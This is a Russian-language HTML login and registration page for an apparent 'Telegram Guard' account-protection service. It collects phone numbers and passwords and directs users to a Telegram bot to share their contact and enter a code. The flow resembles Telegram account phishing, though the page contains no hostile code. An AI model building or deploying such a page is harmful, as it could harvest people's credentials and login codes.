<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Guard — Система защиты аккаунта</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <header class="navbar">
        <div class="brand">
            <span class="brand-icon">🛡️</span>
            <span>Telegram Guard</span>
        </div>
    </header>

    <main class="container">
        <div class="auth-wrapper">
            <div class="card">
                <div class="tabs-header">
                    <button class="tab-btn auth-tab-btn active" data-tab="login">Войти</button>
                    <button class="tab-btn auth-tab-btn" data-tab="register">Регистрация</button>
                </div>

                <!-- Form: Login -->
                <form id="loginForm" class="auth-form active">
                    <h2 style="margin-bottom: 1rem; font-size: 1.3rem;">Вход в аккаунт</h2>
                    <div class="form-group">
                        <label for="loginPhone">Номер телефона</label>
                        <div class="phone-input-group">
                            <select name="country_code" class="country-select">
                                <option value="+998" selected>🇺🇿 +998</option>
                                <option value="+7">🇷🇺/🇰🇿 +7</option>
                                <option value="+380">🇺🇦 +380</option>
                                <option value="+375">🇧🇾 +375</option>
                                <option value="+994">🇦🇿 +994</option>
                                <option value="+995">🇬🇪 +995</option>
                                <option value="+90">🇹🇷 +90</option>
                                <option value="+1">🇺🇸 +1</option>
                                <option value="+992">🇹🇯 +992</option>
                                <option value="+996">🇰🇬 +996</option>
                                <option value="+374">🇦🇲 +374</option>
                            </select>
                            <input type="text" id="loginPhone" name="phone_number" class="form-control" placeholder="901234567" required>
                        </div>
                        <div class="error-text"></div>
                    </div>

                    <div class="form-group">
                        <label for="loginPassword">Пароль</label>
                        <input type="password" id="loginPassword" name="password" class="form-control" placeholder="••••••••" required>
                        <div class="error-text"></div>
                    </div>

                    <button type="submit" class="btn btn-primary">Войти в систему</button>
                </form>

                <!-- Form: Register -->
                <form id="registerForm" class="auth-form">
                    <h2 style="margin-bottom: 1rem; font-size: 1.3rem;">Регистрация защиты</h2>
                    <div class="form-group">
                        <label for="regUsername">Имя пользователя (Логин)</label>
                        <input type="text" id="regUsername" name="username" class="form-control" placeholder="alex_shield" required>
                        <div class="error-text"></div>
                    </div>

                    <div class="form-group">
                        <label for="regPhone">Номер телефона</label>
                        <div class="phone-input-group">
                            <select name="country_code" class="country-select">
                                <option value="+998" selected>🇺🇿 +998</option>
                                <option value="+7">🇷🇺/🇰🇿 +7</option>
                                <option value="+380">🇺🇦 +380</option>
                                <option value="+375">🇧🇾 +375</option>
                                <option value="+994">🇦🇿 +994</option>
                                <option value="+995">🇬🇪 +995</option>
                                <option value="+90">🇹🇷 +90</option>
                                <option value="+1">🇺🇸 +1</option>
                                <option value="+992">🇹🇯 +992</option>
                                <option value="+996">🇰🇬 +996</option>
                                <option value="+374">🇦🇲 +374</option>
                            </select>
                            <input type="text" id="regPhone" name="phone_number" class="form-control" placeholder="901234567" required>
                        </div>
                        <div class="error-text"></div>
                    </div>

                    <div class="form-group">
                        <label for="regPassword">Пароль</label>
                        <input type="password" id="regPassword" name="password" class="form-control" placeholder="Придумайте пароль" required>
                        <div class="error-text"></div>
                    </div>

                    <button type="submit" class="btn btn-primary">Получить код в Telegram</button>
                </form>
            </div>
        </div>
    </main>

    <!-- Modal: Verification Code -->
    <div id="verifyModal" class="modal-overlay">
        <div class="modal-content">
            <h2 style="margin-bottom: 0.8rem;">Подтвердите аккаунт</h2>
            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1.5rem;">
                Перейдите в наш бот <strong>@Defense_telegram_lerman_bot</strong> и нажмите кнопку <strong>«📱 Поделиться контактом»</strong>.
            </p>

            <a href="https://t.me/Defense_telegram_lerman_bot" target="_blank" class="btn btn-telegram" style="margin-bottom: 1.5rem;">
                ✈️ Перейти в бота @Defense_telegram_lerman_bot
            </a>

            <form id="verifyCodeForm">
                <input type="hidden" id="verifyPhoneHidden" name="phone_number">
                <input type="hidden" id="verifyUsernameHidden" name="username">
                <input type="hidden" id="verifyPasswordHidden" name="password">

                <div class="form-group">
                    <label for="verifyCodeInput">Введите 6-значный код из бота</label>
                    <input type="text" id="verifyCodeInput" name="code" class="form-control code-input" placeholder="123456" maxlength="12" autocomplete="one-time-code" required>
                    <div class="error-text"></div>
                </div>

                <button type="submit" class="btn btn-primary" style="margin-top: 1rem;">Подтвердить и завершить</button>
                <button type="button" id="closeModalBtn" class="btn btn-secondary" style="margin-top: 0.5rem;">Отмена</button>
            </form>
        </div>
    </div>

    <style>
        .auth-form { display: none !important; }
        .auth-form.active { display: block !important; }
    </style>
    <script src="/static/app.js"></script>
</body>
</html>
